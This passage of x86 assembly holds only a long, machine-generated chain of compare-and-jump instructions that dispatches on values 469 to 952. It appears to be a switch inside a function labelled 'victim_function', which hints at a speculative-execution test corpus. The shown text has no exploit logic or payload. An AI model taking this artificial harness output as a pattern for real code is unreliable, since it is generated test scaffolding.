	je	.Lvictim_function_win0_var469
	cmpl	$470, %eax
	je	.Lvictim_function_win0_var470
	cmpl	$471, %eax
	je	.Lvictim_function_win0_var471
	cmpl	$472, %eax
	je	.Lvictim_function_win0_var472
	cmpl	$473, %eax
	je	.Lvictim_function_win0_var473
	cmpl	$474, %eax
	je	.Lvictim_function_win0_var474
	cmpl	$475, %eax
	je	.Lvictim_function_win0_var475
	cmpl	$476, %eax
	je	.Lvictim_function_win0_var476
	cmpl	$477, %eax
	je	.Lvictim_function_win0_var477
	cmpl	$478, %eax
	je	.Lvictim_function_win0_var478
	cmpl	$479, %eax
	je	.Lvictim_function_win0_var479
	cmpl	$480, %eax
	je	.Lvictim_function_win0_var480
	cmpl	$481, %eax
	je	.Lvictim_function_win0_var481
	cmpl	$482, %eax
	je	.Lvictim_function_win0_var482
	cmpl	$483, %eax
	je	.Lvictim_function_win0_var483
	cmpl	$484, %eax
	je	.Lvictim_function_win0_var484
	cmpl	$485, %eax
	je	.Lvictim_function_win0_var485
	cmpl	$486, %eax
	je	.Lvictim_function_win0_var486
	cmpl	$487, %eax
	je	.Lvictim_function_win0_var487
	cmpl	$488, %eax
	je	.Lvictim_function_win0_var488
	cmpl	$489, %eax
	je	.Lvictim_function_win0_var489
	cmpl	$490, %eax
	je	.Lvictim_function_win0_var490
	cmpl	$491, %eax
	je	.Lvictim_function_win0_var491
	cmpl	$492, %eax
	je	.Lvictim_function_win0_var492
	cmpl	$493, %eax
	je	.Lvictim_function_win0_var493
	cmpl	$494, %eax
	je	.Lvictim_function_win0_var494
	cmpl	$495, %eax
	je	.Lvictim_function_win0_var495
	cmpl	$496, %eax
	je	.Lvictim_function_win0_var496
	cmpl	$497, %eax
	je	.Lvictim_function_win0_var497
	cmpl	$498, %eax
	je	.Lvictim_function_win0_var498
	cmpl	$499, %eax
	je	.Lvictim_function_win0_var499
	cmpl	$500, %eax
	je	.Lvictim_function_win0_var500
	cmpl	$501, %eax
	je	.Lvictim_function_win0_var501
	cmpl	$502, %eax
	je	.Lvictim_function_win0_var502
	cmpl	$503, %eax
	je	.Lvictim_function_win0_var503
	cmpl	$504, %eax
	je	.Lvictim_function_win0_var504
	cmpl	$505, %eax
	je	.Lvictim_function_win0_var505
	cmpl	$506, %eax
	je	.Lvictim_function_win0_var506
	cmpl	$507, %eax
	je	.Lvictim_function_win0_var507
	cmpl	$508, %eax
	je	.Lvictim_function_win0_var508
	cmpl	$509, %eax
	je	.Lvictim_function_win0_var509
	cmpl	$510, %eax
	je	.Lvictim_function_win0_var510
	cmpl	$511, %eax
	je	.Lvictim_function_win0_var511
	cmpl	$512, %eax
	je	.Lvictim_function_win0_var512
	cmpl	$513, %eax
	je	.Lvictim_function_win0_var513
	cmpl	$514, %eax
	je	.Lvictim_function_win0_var514
	cmpl	$515, %eax
	je	.Lvictim_function_win0_var515
	cmpl	$516, %eax
	je	.Lvictim_function_win0_var516
	cmpl	$517, %eax
	je	.Lvictim_function_win0_var517
	cmpl	$518, %eax
	je	.Lvictim_function_win0_var518
	cmpl	$519, %eax
	je	.Lvictim_function_win0_var519
	cmpl	$520, %eax
	je	.Lvictim_function_win0_var520
	cmpl	$521, %eax
	je	.Lvictim_function_win0_var521
	cmpl	$522, %eax
	je	.Lvictim_function_win0_var522
	cmpl	$523, %eax
	je	.Lvictim_function_win0_var523
	cmpl	$524, %eax
	je	.Lvictim_function_win0_var524
	cmpl	$525, %eax
	je	.Lvictim_function_win0_var525
	cmpl	$526, %eax
	je	.Lvictim_function_win0_var526
	cmpl	$527, %eax
	je	.Lvictim_function_win0_var527
	cmpl	$528, %eax
	je	.Lvictim_function_win0_var528
	cmpl	$529, %eax
	je	.Lvictim_function_win0_var529
	cmpl	$530, %eax
	je	.Lvictim_function_win0_var530
	cmpl	$531, %eax
	je	.Lvictim_function_win0_var531
	cmpl	$532, %eax
	je	.Lvictim_function_win0_var532
	cmpl	$533, %eax
	je	.Lvictim_function_win0_var533
	cmpl	$534, %eax
	je	.Lvictim_function_win0_var534
	cmpl	$535, %eax
	je	.Lvictim_function_win0_var535
	cmpl	$536, %eax
	je	.Lvictim_function_win0_var536
	cmpl	$537, %eax
	je	.Lvictim_function_win0_var537
	cmpl	$538, %eax
	je	.Lvictim_function_win0_var538
	cmpl	$539, %eax
	je	.Lvictim_function_win0_var539
	cmpl	$540, %eax
	je	.Lvictim_function_win0_var540
	cmpl	$541, %eax
	je	.Lvictim_function_win0_var541
	cmpl	$542, %eax
	je	.Lvictim_function_win0_var542
	cmpl	$543, %eax
	je	.Lvictim_function_win0_var543
	cmpl	$544, %eax
	je	.Lvictim_function_win0_var544
	cmpl	$545, %eax
	je	.Lvictim_function_win0_var545
	cmpl	$546, %eax
	je	.Lvictim_function_win0_var546
	cmpl	$547, %eax
	je	.Lvictim_function_win0_var547
	cmpl	$548, %eax
	je	.Lvictim_function_win0_var548
	cmpl	$549, %eax
	je	.Lvictim_function_win0_var549
	cmpl	$550, %eax
	je	.Lvictim_function_win0_var550
	cmpl	$551, %eax
	je	.Lvictim_function_win0_var551
	cmpl	$552, %eax
	je	.Lvictim_function_win0_var552
	cmpl	$553, %eax
	je	.Lvictim_function_win0_var553
	cmpl	$554, %eax
	je	.Lvictim_function_win0_var554
	cmpl	$555, %eax
	je	.Lvictim_function_win0_var555
	cmpl	$556, %eax
	je	.Lvictim_function_win0_var556
	cmpl	$557, %eax
	je	.Lvictim_function_win0_var557
	cmpl	$558, %eax
	je	.Lvictim_function_win0_var558
	cmpl	$559, %eax
	je	.Lvictim_function_win0_var559
	cmpl	$560, %eax
	je	.Lvictim_function_win0_var560
	cmpl	$561, %eax
	je	.Lvictim_function_win0_var561
	cmpl	$562, %eax
	je	.Lvictim_function_win0_var562
	cmpl	$563, %eax
	je	.Lvictim_function_win0_var563
	cmpl	$564, %eax
	je	.Lvictim_function_win0_var564
	cmpl	$565, %eax
	je	.Lvictim_function_win0_var565
	cmpl	$566, %eax
	je	.Lvictim_function_win0_var566
	cmpl	$567, %eax
	je	.Lvictim_function_win0_var567
	cmpl	$568, %eax
	je	.Lvictim_function_win0_var568
	cmpl	$569, %eax
	je	.Lvictim_function_win0_var569
	cmpl	$570, %eax
	je	.Lvictim_function_win0_var570
	cmpl	$571, %eax
	je	.Lvictim_function_win0_var571
	cmpl	$572, %eax
	je	.Lvictim_function_win0_var572
	cmpl	$573, %eax
	je	.Lvictim_function_win0_var573
	cmpl	$574, %eax
	je	.Lvictim_function_win0_var574
	cmpl	$575, %eax
	je	.Lvictim_function_win0_var575
	cmpl	$576, %eax
	je	.Lvictim_function_win0_var576
	cmpl	$577, %eax
	je	.Lvictim_function_win0_var577
	cmpl	$578, %eax
	je	.Lvictim_function_win0_var578
	cmpl	$579, %eax
	je	.Lvictim_function_win0_var579
	cmpl	$580, %eax
	je	.Lvictim_function_win0_var580
	cmpl	$581, %eax
	je	.Lvictim_function_win0_var581
	cmpl	$582, %eax
	je	.Lvictim_function_win0_var582
	cmpl	$583, %eax
	je	.Lvictim_function_win0_var583
	cmpl	$584, %eax
	je	.Lvictim_function_win0_var584
	cmpl	$585, %eax
	je	.Lvictim_function_win0_var585
	cmpl	$586, %eax
	je	.Lvictim_function_win0_var586
	cmpl	$587, %eax
	je	.Lvictim_function_win0_var587
	cmpl	$588, %eax
	je	.Lvictim_function_win0_var588
	cmpl	$589, %eax
	je	.Lvictim_function_win0_var589
	cmpl	$590, %eax
	je	.Lvictim_function_win0_var590
	cmpl	$591, %eax
	je	.Lvictim_function_win0_var591
	cmpl	$592, %eax
	je	.Lvictim_function_win0_var592
	cmpl	$593, %eax
	je	.Lvictim_function_win0_var593
	cmpl	$594, %eax
	je	.Lvictim_function_win0_var594
	cmpl	$595, %eax
	je	.Lvictim_function_win0_var595
	cmpl	$596, %eax
	je	.Lvictim_function_win0_var596
	cmpl	$597, %eax
	je	.Lvictim_function_win0_var597
	cmpl	$598, %eax
	je	.Lvictim_function_win0_var598
	cmpl	$599, %eax
	je	.Lvictim_function_win0_var599
	cmpl	$600, %eax
	je	.Lvictim_function_win0_var600
	cmpl	$601, %eax
	je	.Lvictim_function_win0_var601
	cmpl	$602, %eax
	je	.Lvictim_function_win0_var602
	cmpl	$603, %eax
	je	.Lvictim_function_win0_var603
	cmpl	$604, %eax
	je	.Lvictim_function_win0_var604
	cmpl	$605, %eax
	je	.Lvictim_function_win0_var605
	cmpl	$606, %eax
	je	.Lvictim_function_win0_var606
	cmpl	$607, %eax
	je	.Lvictim_function_win0_var607
	cmpl	$608, %eax
	je	.Lvictim_function_win0_var608
	cmpl	$609, %eax
	je	.Lvictim_function_win0_var609
	cmpl	$610, %eax
	je	.Lvictim_function_win0_var610
	cmpl	$611, %eax
	je	.Lvictim_function_win0_var611
	cmpl	$612, %eax
	je	.Lvictim_function_win0_var612
	cmpl	$613, %eax
	je	.Lvictim_function_win0_var613
	cmpl	$614, %eax
	je	.Lvictim_function_win0_var614
	cmpl	$615, %eax
	je	.Lvictim_function_win0_var615
	cmpl	$616, %eax
	je	.Lvictim_function_win0_var616
	cmpl	$617, %eax
	je	.Lvictim_function_win0_var617
	cmpl	$618, %eax
	je	.Lvictim_function_win0_var618
	cmpl	$619, %eax
	je	.Lvictim_function_win0_var619
	cmpl	$620, %eax
	je	.Lvictim_function_win0_var620
	cmpl	$621, %eax
	je	.Lvictim_function_win0_var621
	cmpl	$622, %eax
	je	.Lvictim_function_win0_var622
	cmpl	$623, %eax
	je	.Lvictim_function_win0_var623
	cmpl	$624, %eax
	je	.Lvictim_function_win0_var624
	cmpl	$625, %eax
	je	.Lvictim_function_win0_var625
	cmpl	$626, %eax
	je	.Lvictim_function_win0_var626
	cmpl	$627, %eax
	je	.Lvictim_function_win0_var627
	cmpl	$628, %eax
	je	.Lvictim_function_win0_var628
	cmpl	$629, %eax
	je	.Lvictim_function_win0_var629
	cmpl	$630, %eax
	je	.Lvictim_function_win0_var630
	cmpl	$631, %eax
	je	.Lvictim_function_win0_var631
	cmpl	$632, %eax
	je	.Lvictim_function_win0_var632
	cmpl	$633, %eax
	je	.Lvictim_function_win0_var633
	cmpl	$634, %eax
	je	.Lvictim_function_win0_var634
	cmpl	$635, %eax
	je	.Lvictim_function_win0_var635
	cmpl	$636, %eax
	je	.Lvictim_function_win0_var636
	cmpl	$637, %eax
	je	.Lvictim_function_win0_var637
	cmpl	$638, %eax
	je	.Lvictim_function_win0_var638
	cmpl	$639, %eax
	je	.Lvictim_function_win0_var639
	cmpl	$640, %eax
	je	.Lvictim_function_win0_var640
	cmpl	$641, %eax
	je	.Lvictim_function_win0_var641
	cmpl	$642, %eax
	je	.Lvictim_function_win0_var642
	cmpl	$643, %eax
	je	.Lvictim_function_win0_var643
	cmpl	$644, %eax
	je	.Lvictim_function_win0_var644
	cmpl	$645, %eax
	je	.Lvictim_function_win0_var645
	cmpl	$646, %eax
	je	.Lvictim_function_win0_var646
	cmpl	$647, %eax
	je	.Lvictim_function_win0_var647
	cmpl	$648, %eax
	je	.Lvictim_function_win0_var648
	cmpl	$649, %eax
	je	.Lvictim_function_win0_var649
	cmpl	$650, %eax
	je	.Lvictim_function_win0_var650
	cmpl	$651, %eax
	je	.Lvictim_function_win0_var651
	cmpl	$652, %eax
	je	.Lvictim_function_win0_var652
	cmpl	$653, %eax
	je	.Lvictim_function_win0_var653
	cmpl	$654, %eax
	je	.Lvictim_function_win0_var654
	cmpl	$655, %eax
	je	.Lvictim_function_win0_var655
	cmpl	$656, %eax
	je	.Lvictim_function_win0_var656
	cmpl	$657, %eax
	je	.Lvictim_function_win0_var657
	cmpl	$658, %eax
	je	.Lvictim_function_win0_var658
	cmpl	$659, %eax
	je	.Lvictim_function_win0_var659
	cmpl	$660, %eax
	je	.Lvictim_function_win0_var660
	cmpl	$661, %eax
	je	.Lvictim_function_win0_var661
	cmpl	$662, %eax
	je	.Lvictim_function_win0_var662
	cmpl	$663, %eax
	je	.Lvictim_function_win0_var663
	cmpl	$664, %eax
	je	.Lvictim_function_win0_var664
	cmpl	$665, %eax
	je	.Lvictim_function_win0_var665
	cmpl	$666, %eax
	je	.Lvictim_function_win0_var666
	cmpl	$667, %eax
	je	.Lvictim_function_win0_var667
	cmpl	$668, %eax
	je	.Lvictim_function_win0_var668
	cmpl	$669, %eax
	je	.Lvictim_function_win0_var669
	cmpl	$670, %eax
	je	.Lvictim_function_win0_var670
	cmpl	$671, %eax
	je	.Lvictim_function_win0_var671
	cmpl	$672, %eax
	je	.Lvictim_function_win0_var672
	cmpl	$673, %eax
	je	.Lvictim_function_win0_var673
	cmpl	$674, %eax
	je	.Lvictim_function_win0_var674
	cmpl	$675, %eax
	je	.Lvictim_function_win0_var675
	cmpl	$676, %eax
	je	.Lvictim_function_win0_var676
	cmpl	$677, %eax
	je	.Lvictim_function_win0_var677
	cmpl	$678, %eax
	je	.Lvictim_function_win0_var678
	cmpl	$679, %eax
	je	.Lvictim_function_win0_var679
	cmpl	$680, %eax
	je	.Lvictim_function_win0_var680
	cmpl	$681, %eax
	je	.Lvictim_function_win0_var681
	cmpl	$682, %eax
	je	.Lvictim_function_win0_var682
	cmpl	$683, %eax
	je	.Lvictim_function_win0_var683
	cmpl	$684, %eax
	je	.Lvictim_function_win0_var684
	cmpl	$685, %eax
	je	.Lvictim_function_win0_var685
	cmpl	$686, %eax
	je	.Lvictim_function_win0_var686
	cmpl	$687, %eax
	je	.Lvictim_function_win0_var687
	cmpl	$688, %eax
	je	.Lvictim_function_win0_var688
	cmpl	$689, %eax
	je	.Lvictim_function_win0_var689
	cmpl	$690, %eax
	je	.Lvictim_function_win0_var690
	cmpl	$691, %eax
	je	.Lvictim_function_win0_var691
	cmpl	$692, %eax
	je	.Lvictim_function_win0_var692
	cmpl	$693, %eax
	je	.Lvictim_function_win0_var693
	cmpl	$694, %eax
	je	.Lvictim_function_win0_var694
	cmpl	$695, %eax
	je	.Lvictim_function_win0_var695
	cmpl	$696, %eax
	je	.Lvictim_function_win0_var696
	cmpl	$697, %eax
	je	.Lvictim_function_win0_var697
	cmpl	$698, %eax
	je	.Lvictim_function_win0_var698
	cmpl	$699, %eax
	je	.Lvictim_function_win0_var699
	cmpl	$700, %eax
	je	.Lvictim_function_win0_var700
	cmpl	$701, %eax
	je	.Lvictim_function_win0_var701
	cmpl	$702, %eax
	je	.Lvictim_function_win0_var702
	cmpl	$703, %eax
	je	.Lvictim_function_win0_var703
	cmpl	$704, %eax
	je	.Lvictim_function_win0_var704
	cmpl	$705, %eax
	je	.Lvictim_function_win0_var705
	cmpl	$706, %eax
	je	.Lvictim_function_win0_var706
	cmpl	$707, %eax
	je	.Lvictim_function_win0_var707
	cmpl	$708, %eax
	je	.Lvictim_function_win0_var708
	cmpl	$709, %eax
	je	.Lvictim_function_win0_var709
	cmpl	$710, %eax
	je	.Lvictim_function_win0_var710
	cmpl	$711, %eax
	je	.Lvictim_function_win0_var711
	cmpl	$712, %eax
	je	.Lvictim_function_win0_var712
	cmpl	$713, %eax
	je	.Lvictim_function_win0_var713
	cmpl	$714, %eax
	je	.Lvictim_function_win0_var714
	cmpl	$715, %eax
	je	.Lvictim_function_win0_var715
	cmpl	$716, %eax
	je	.Lvictim_function_win0_var716
	cmpl	$717, %eax
	je	.Lvictim_function_win0_var717
	cmpl	$718, %eax
	je	.Lvictim_function_win0_var718
	cmpl	$719, %eax
	je	.Lvictim_function_win0_var719
	cmpl	$720, %eax
	je	.Lvictim_function_win0_var720
	cmpl	$721, %eax
	je	.Lvictim_function_win0_var721
	cmpl	$722, %eax
	je	.Lvictim_function_win0_var722
	cmpl	$723, %eax
	je	.Lvictim_function_win0_var723
	cmpl	$724, %eax
	je	.Lvictim_function_win0_var724
	cmpl	$725, %eax
	je	.Lvictim_function_win0_var725
	cmpl	$726, %eax
	je	.Lvictim_function_win0_var726
	cmpl	$727, %eax
	je	.Lvictim_function_win0_var727
	cmpl	$728, %eax
	je	.Lvictim_function_win0_var728
	cmpl	$729, %eax
	je	.Lvictim_function_win0_var729
	cmpl	$730, %eax
	je	.Lvictim_function_win0_var730
	cmpl	$731, %eax
	je	.Lvictim_function_win0_var731
	cmpl	$732, %eax
	je	.Lvictim_function_win0_var732
	cmpl	$733, %eax
	je	.Lvictim_function_win0_var733
	cmpl	$734, %eax
	je	.Lvictim_function_win0_var734
	cmpl	$735, %eax
	je	.Lvictim_function_win0_var735
	cmpl	$736, %eax
	je	.Lvictim_function_win0_var736
	cmpl	$737, %eax
	je	.Lvictim_function_win0_var737
	cmpl	$738, %eax
	je	.Lvictim_function_win0_var738
	cmpl	$739, %eax
	je	.Lvictim_function_win0_var739
	cmpl	$740, %eax
	je	.Lvictim_function_win0_var740
	cmpl	$741, %eax
	je	.Lvictim_function_win0_var741
	cmpl	$742, %eax
	je	.Lvictim_function_win0_var742
	cmpl	$743, %eax
	je	.Lvictim_function_win0_var743
	cmpl	$744, %eax
	je	.Lvictim_function_win0_var744
	cmpl	$745, %eax
	je	.Lvictim_function_win0_var745
	cmpl	$746, %eax
	je	.Lvictim_function_win0_var746
	cmpl	$747, %eax
	je	.Lvictim_function_win0_var747
	cmpl	$748, %eax
	je	.Lvictim_function_win0_var748
	cmpl	$749, %eax
	je	.Lvictim_function_win0_var749
	cmpl	$750, %eax
	je	.Lvictim_function_win0_var750
	cmpl	$751, %eax
	je	.Lvictim_function_win0_var751
	cmpl	$752, %eax
	je	.Lvictim_function_win0_var752
	cmpl	$753, %eax
	je	.Lvictim_function_win0_var753
	cmpl	$754, %eax
	je	.Lvictim_function_win0_var754
	cmpl	$755, %eax
	je	.Lvictim_function_win0_var755
	cmpl	$756, %eax
	je	.Lvictim_function_win0_var756
	cmpl	$757, %eax
	je	.Lvictim_function_win0_var757
	cmpl	$758, %eax
	je	.Lvictim_function_win0_var758
	cmpl	$759, %eax
	je	.Lvictim_function_win0_var759
	cmpl	$760, %eax
	je	.Lvictim_function_win0_var760
	cmpl	$761, %eax
	je	.Lvictim_function_win0_var761
	cmpl	$762, %eax
	je	.Lvictim_function_win0_var762
	cmpl	$763, %eax
	je	.Lvictim_function_win0_var763
	cmpl	$764, %eax
	je	.Lvictim_function_win0_var764
	cmpl	$765, %eax
	je	.Lvictim_function_win0_var765
	cmpl	$766, %eax
	je	.Lvictim_function_win0_var766
	cmpl	$767, %eax
	je	.Lvictim_function_win0_var767
	cmpl	$768, %eax
	je	.Lvictim_function_win0_var768
	cmpl	$769, %eax
	je	.Lvictim_function_win0_var769
	cmpl	$770, %eax
	je	.Lvictim_function_win0_var770
	cmpl	$771, %eax
	je	.Lvictim_function_win0_var771
	cmpl	$772, %eax
	je	.Lvictim_function_win0_var772
	cmpl	$773, %eax
	je	.Lvictim_function_win0_var773
	cmpl	$774, %eax
	je	.Lvictim_function_win0_var774
	cmpl	$775, %eax
	je	.Lvictim_function_win0_var775
	cmpl	$776, %eax
	je	.Lvictim_function_win0_var776
	cmpl	$777, %eax
	je	.Lvictim_function_win0_var777
	cmpl	$778, %eax
	je	.Lvictim_function_win0_var778
	cmpl	$779, %eax
	je	.Lvictim_function_win0_var779
	cmpl	$780, %eax
	je	.Lvictim_function_win0_var780
	cmpl	$781, %eax
	je	.Lvictim_function_win0_var781
	cmpl	$782, %eax
	je	.Lvictim_function_win0_var782
	cmpl	$783, %eax
	je	.Lvictim_function_win0_var783
	cmpl	$784, %eax
	je	.Lvictim_function_win0_var784
	cmpl	$785, %eax
	je	.Lvictim_function_win0_var785
	cmpl	$786, %eax
	je	.Lvictim_function_win0_var786
	cmpl	$787, %eax
	je	.Lvictim_function_win0_var787
	cmpl	$788, %eax
	je	.Lvictim_function_win0_var788
	cmpl	$789, %eax
	je	.Lvictim_function_win0_var789
	cmpl	$790, %eax
	je	.Lvictim_function_win0_var790
	cmpl	$791, %eax
	je	.Lvictim_function_win0_var791
	cmpl	$792, %eax
	je	.Lvictim_function_win0_var792
	cmpl	$793, %eax
	je	.Lvictim_function_win0_var793
	cmpl	$794, %eax
	je	.Lvictim_function_win0_var794
	cmpl	$795, %eax
	je	.Lvictim_function_win0_var795
	cmpl	$796, %eax
	je	.Lvictim_function_win0_var796
	cmpl	$797, %eax
	je	.Lvictim_function_win0_var797
	cmpl	$798, %eax
	je	.Lvictim_function_win0_var798
	cmpl	$799, %eax
	je	.Lvictim_function_win0_var799
	cmpl	$800, %eax
	je	.Lvictim_function_win0_var800
	cmpl	$801, %eax
	je	.Lvictim_function_win0_var801
	cmpl	$802, %eax
	je	.Lvictim_function_win0_var802
	cmpl	$803, %eax
	je	.Lvictim_function_win0_var803
	cmpl	$804, %eax
	je	.Lvictim_function_win0_var804
	cmpl	$805, %eax
	je	.Lvictim_function_win0_var805
	cmpl	$806, %eax
	je	.Lvictim_function_win0_var806
	cmpl	$807, %eax
	je	.Lvictim_function_win0_var807
	cmpl	$808, %eax
	je	.Lvictim_function_win0_var808
	cmpl	$809, %eax
	je	.Lvictim_function_win0_var809
	cmpl	$810, %eax
	je	.Lvictim_function_win0_var810
	cmpl	$811, %eax
	je	.Lvictim_function_win0_var811
	cmpl	$812, %eax
	je	.Lvictim_function_win0_var812
	cmpl	$813, %eax
	je	.Lvictim_function_win0_var813
	cmpl	$814, %eax
	je	.Lvictim_function_win0_var814
	cmpl	$815, %eax
	je	.Lvictim_function_win0_var815
	cmpl	$816, %eax
	je	.Lvictim_function_win0_var816
	cmpl	$817, %eax
	je	.Lvictim_function_win0_var817
	cmpl	$818, %eax
	je	.Lvictim_function_win0_var818
	cmpl	$819, %eax
	je	.Lvictim_function_win0_var819
	cmpl	$820, %eax
	je	.Lvictim_function_win0_var820
	cmpl	$821, %eax
	je	.Lvictim_function_win0_var821
	cmpl	$822, %eax
	je	.Lvictim_function_win0_var822
	cmpl	$823, %eax
	je	.Lvictim_function_win0_var823
	cmpl	$824, %eax
	je	.Lvictim_function_win0_var824
	cmpl	$825, %eax
	je	.Lvictim_function_win0_var825
	cmpl	$826, %eax
	je	.Lvictim_function_win0_var826
	cmpl	$827, %eax
	je	.Lvictim_function_win0_var827
	cmpl	$828, %eax
	je	.Lvictim_function_win0_var828
	cmpl	$829, %eax
	je	.Lvictim_function_win0_var829
	cmpl	$830, %eax
	je	.Lvictim_function_win0_var830
	cmpl	$831, %eax
	je	.Lvictim_function_win0_var831
	cmpl	$832, %eax
	je	.Lvictim_function_win0_var832
	cmpl	$833, %eax
	je	.Lvictim_function_win0_var833
	cmpl	$834, %eax
	je	.Lvictim_function_win0_var834
	cmpl	$835, %eax
	je	.Lvictim_function_win0_var835
	cmpl	$836, %eax
	je	.Lvictim_function_win0_var836
	cmpl	$837, %eax
	je	.Lvictim_function_win0_var837
	cmpl	$838, %eax
	je	.Lvictim_function_win0_var838
	cmpl	$839, %eax
	je	.Lvictim_function_win0_var839
	cmpl	$840, %eax
	je	.Lvictim_function_win0_var840
	cmpl	$841, %eax
	je	.Lvictim_function_win0_var841
	cmpl	$842, %eax
	je	.Lvictim_function_win0_var842
	cmpl	$843, %eax
	je	.Lvictim_function_win0_var843
	cmpl	$844, %eax
	je	.Lvictim_function_win0_var844
	cmpl	$845, %eax
	je	.Lvictim_function_win0_var845
	cmpl	$846, %eax
	je	.Lvictim_function_win0_var846
	cmpl	$847, %eax
	je	.Lvictim_function_win0_var847
	cmpl	$848, %eax
	je	.Lvictim_function_win0_var848
	cmpl	$849, %eax
	je	.Lvictim_function_win0_var849
	cmpl	$850, %eax
	je	.Lvictim_function_win0_var850
	cmpl	$851, %eax
	je	.Lvictim_function_win0_var851
	cmpl	$852, %eax
	je	.Lvictim_function_win0_var852
	cmpl	$853, %eax
	je	.Lvictim_function_win0_var853
	cmpl	$854, %eax
	je	.Lvictim_function_win0_var854
	cmpl	$855, %eax
	je	.Lvictim_function_win0_var855
	cmpl	$856, %eax
	je	.Lvictim_function_win0_var856
	cmpl	$857, %eax
	je	.Lvictim_function_win0_var857
	cmpl	$858, %eax
	je	.Lvictim_function_win0_var858
	cmpl	$859, %eax
	je	.Lvictim_function_win0_var859
	cmpl	$860, %eax
	je	.Lvictim_function_win0_var860
	cmpl	$861, %eax
	je	.Lvictim_function_win0_var861
	cmpl	$862, %eax
	je	.Lvictim_function_win0_var862
	cmpl	$863, %eax
	je	.Lvictim_function_win0_var863
	cmpl	$864, %eax
	je	.Lvictim_function_win0_var864
	cmpl	$865, %eax
	je	.Lvictim_function_win0_var865
	cmpl	$866, %eax
	je	.Lvictim_function_win0_var866
	cmpl	$867, %eax
	je	.Lvictim_function_win0_var867
	cmpl	$868, %eax
	je	.Lvictim_function_win0_var868
	cmpl	$869, %eax
	je	.Lvictim_function_win0_var869
	cmpl	$870, %eax
	je	.Lvictim_function_win0_var870
	cmpl	$871, %eax
	je	.Lvictim_function_win0_var871
	cmpl	$872, %eax
	je	.Lvictim_function_win0_var872
	cmpl	$873, %eax
	je	.Lvictim_function_win0_var873
	cmpl	$874, %eax
	je	.Lvictim_function_win0_var874
	cmpl	$875, %eax
	je	.Lvictim_function_win0_var875
	cmpl	$876, %eax
	je	.Lvictim_function_win0_var876
	cmpl	$877, %eax
	je	.Lvictim_function_win0_var877
	cmpl	$878, %eax
	je	.Lvictim_function_win0_var878
	cmpl	$879, %eax
	je	.Lvictim_function_win0_var879
	cmpl	$880, %eax
	je	.Lvictim_function_win0_var880
	cmpl	$881, %eax
	je	.Lvictim_function_win0_var881
	cmpl	$882, %eax
	je	.Lvictim_function_win0_var882
	cmpl	$883, %eax
	je	.Lvictim_function_win0_var883
	cmpl	$884, %eax
	je	.Lvictim_function_win0_var884
	cmpl	$885, %eax
	je	.Lvictim_function_win0_var885
	cmpl	$886, %eax
	je	.Lvictim_function_win0_var886
	cmpl	$887, %eax
	je	.Lvictim_function_win0_var887
	cmpl	$888, %eax
	je	.Lvictim_function_win0_var888
	cmpl	$889, %eax
	je	.Lvictim_function_win0_var889
	cmpl	$890, %eax
	je	.Lvictim_function_win0_var890
	cmpl	$891, %eax
	je	.Lvictim_function_win0_var891
	cmpl	$892, %eax
	je	.Lvictim_function_win0_var892
	cmpl	$893, %eax
	je	.Lvictim_function_win0_var893
	cmpl	$894, %eax
	je	.Lvictim_function_win0_var894
	cmpl	$895, %eax
	je	.Lvictim_function_win0_var895
	cmpl	$896, %eax
	je	.Lvictim_function_win0_var896
	cmpl	$897, %eax
	je	.Lvictim_function_win0_var897
	cmpl	$898, %eax
	je	.Lvictim_function_win0_var898
	cmpl	$899, %eax
	je	.Lvictim_function_win0_var899
	cmpl	$900, %eax
	je	.Lvictim_function_win0_var900
	cmpl	$901, %eax
	je	.Lvictim_function_win0_var901
	cmpl	$902, %eax
	je	.Lvictim_function_win0_var902
	cmpl	$903, %eax
	je	.Lvictim_function_win0_var903
	cmpl	$904, %eax
	je	.Lvictim_function_win0_var904
	cmpl	$905, %eax
	je	.Lvictim_function_win0_var905
	cmpl	$906, %eax
	je	.Lvictim_function_win0_var906
	cmpl	$907, %eax
	je	.Lvictim_function_win0_var907
	cmpl	$908, %eax
	je	.Lvictim_function_win0_var908
	cmpl	$909, %eax
	je	.Lvictim_function_win0_var909
	cmpl	$910, %eax
	je	.Lvictim_function_win0_var910
	cmpl	$911, %eax
	je	.Lvictim_function_win0_var911
	cmpl	$912, %eax
	je	.Lvictim_function_win0_var912
	cmpl	$913, %eax
	je	.Lvictim_function_win0_var913
	cmpl	$914, %eax
	je	.Lvictim_function_win0_var914
	cmpl	$915, %eax
	je	.Lvictim_function_win0_var915
	cmpl	$916, %eax
	je	.Lvictim_function_win0_var916
	cmpl	$917, %eax
	je	.Lvictim_function_win0_var917
	cmpl	$918, %eax
	je	.Lvictim_function_win0_var918
	cmpl	$919, %eax
	je	.Lvictim_function_win0_var919
	cmpl	$920, %eax
	je	.Lvictim_function_win0_var920
	cmpl	$921, %eax
	je	.Lvictim_function_win0_var921
	cmpl	$922, %eax
	je	.Lvictim_function_win0_var922
	cmpl	$923, %eax
	je	.Lvictim_function_win0_var923
	cmpl	$924, %eax
	je	.Lvictim_function_win0_var924
	cmpl	$925, %eax
	je	.Lvictim_function_win0_var925
	cmpl	$926, %eax
	je	.Lvictim_function_win0_var926
	cmpl	$927, %eax
	je	.Lvictim_function_win0_var927
	cmpl	$928, %eax
	je	.Lvictim_function_win0_var928
	cmpl	$929, %eax
	je	.Lvictim_function_win0_var929
	cmpl	$930, %eax
	je	.Lvictim_function_win0_var930
	cmpl	$931, %eax
	je	.Lvictim_function_win0_var931
	cmpl	$932, %eax
	je	.Lvictim_function_win0_var932
	cmpl	$933, %eax
	je	.Lvictim_function_win0_var933
	cmpl	$934, %eax
	je	.Lvictim_function_win0_var934
	cmpl	$935, %eax
	je	.Lvictim_function_win0_var935
	cmpl	$936, %eax
	je	.Lvictim_function_win0_var936
	cmpl	$937, %eax
	je	.Lvictim_function_win0_var937
	cmpl	$938, %eax
	je	.Lvictim_function_win0_var938
	cmpl	$939, %eax
	je	.Lvictim_function_win0_var939
	cmpl	$940, %eax
	je	.Lvictim_function_win0_var940
	cmpl	$941, %eax
	je	.Lvictim_function_win0_var941
	cmpl	$942, %eax
	je	.Lvictim_function_win0_var942
	cmpl	$943, %eax
	je	.Lvictim_function_win0_var943
	cmpl	$944, %eax
	je	.Lvictim_function_win0_var944
	cmpl	$945, %eax
	je	.Lvictim_function_win0_var945
	cmpl	$946, %eax
	je	.Lvictim_function_win0_var946
	cmpl	$947, %eax
	je	.Lvictim_function_win0_var947
	cmpl	$948, %eax
	je	.Lvictim_function_win0_var948
	cmpl	$949, %eax
	je	.Lvictim_function_win0_var949
	cmpl	$950, %eax
	je	.Lvictim_function_win0_var950
	cmpl	$951, %eax
	je	.Lvictim_function_win0_var951
	cmpl	$952, %eax
	je	.Lvictim_function_win0_var952
